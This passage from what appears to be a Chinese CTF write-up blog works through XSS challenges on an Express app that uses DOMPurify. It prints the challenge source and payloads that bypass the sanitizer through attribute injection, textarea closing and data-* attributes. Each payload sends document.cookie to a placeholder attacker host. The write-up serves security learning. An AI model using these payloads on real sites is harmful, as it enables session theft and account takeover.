class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content&#125;&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>他把我们输入的内容全都检查了一遍，但是采用默认的配置，我们了解<code>DOMPurify.sanitize</code>的<a href="https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes">原理</a></p><p>我们输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>  <br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112503557.png" alt="image-20250312112503557"></p><p>发现<code>onload</code>被过滤但是我们输入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">onload</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>发现没有被过滤</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112627575.png" alt="image-20250312112627575"></p><p>那我就可以拼接构造xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">layout:  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>  <br><br>content:    test&quot; onload=location.href=&quot;http://IP:PORT?flag=&quot;+document.cookie src=&quot;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112836467.png" alt="image-20250312112836467"></p><p>成功跳转</p><p>第二种思路就是闭合<code>&lt;/textarea&gt;</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184144330.png" alt="image-20250312184144330"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">logout</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><br><span class="hljs-attr">content</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;&lt;/textarea&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=x onerror=fetch(&#x27;&#123;YOUR_URL&#125;&#x27;+document.cookie)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184425906.png" alt="image-20250312184425906"></p><p>也是成功解析</p><h2 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe_layout"></a>safe_layout</h2><p>难度高的吓人(bushi)😁，前端的知识还是迷迷糊糊的不清楚</p><p>源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>看输入部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>与<code>bady logout</code>相比加了<code> &#123; ALLOWED_ATTR: [] &#125;</code>,禁用所有<code>html</code>标签,<code>src</code>会被过滤</p><p>但是data-* 和 aria-* 类的属性是不会被过滤的</p><p>参考这篇<a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">文章</a></p><p><code>data-*</code> 和 <code>aria-*</code> 是 “安全的” 自定义属性，不会被过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;svg data-type=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;&lt;/svg&gt;<br><br>test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.xxx.xxx.xxx:xxxx?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312120033286.png" alt="image-20250312120033286"></p><p>成功解析</p><p>同样也可以用<code>&lt;/textarea&gt;</code>构造闭合</p><p>由于data-* 和 aria-* 类的属性是不会被过滤的</p><p>我们采用data-* 和 aria-* 类的属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">logout</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><br><span class="hljs-attr">content</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">data-c</span>=<span class="hljs-string">&quot;&lt;/textarea&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=x onerror=fetch(&#x27;&#123;YOUR_URL&#125;&#x27;+document.cookie)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312200534311.png" alt="image-20250312200534311"></p><p>成功解析</p><h2 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h2><p>怎么国际赛全是xss啊</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 